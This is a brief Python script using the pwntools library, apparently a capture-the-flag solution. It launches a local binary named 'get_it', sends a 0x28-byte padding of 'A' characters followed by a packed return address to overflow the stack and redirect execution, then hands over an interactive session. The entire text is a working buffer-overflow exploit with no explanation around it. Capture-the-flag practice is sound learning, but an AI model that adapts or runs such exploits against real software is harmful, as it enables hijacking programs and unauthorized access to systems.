#!/usr/bin/env python
from pwn import *
p = process("./get_it")

p.sendline(b"A" * 0x28 + p64(0x4005b6))

p.interactive()
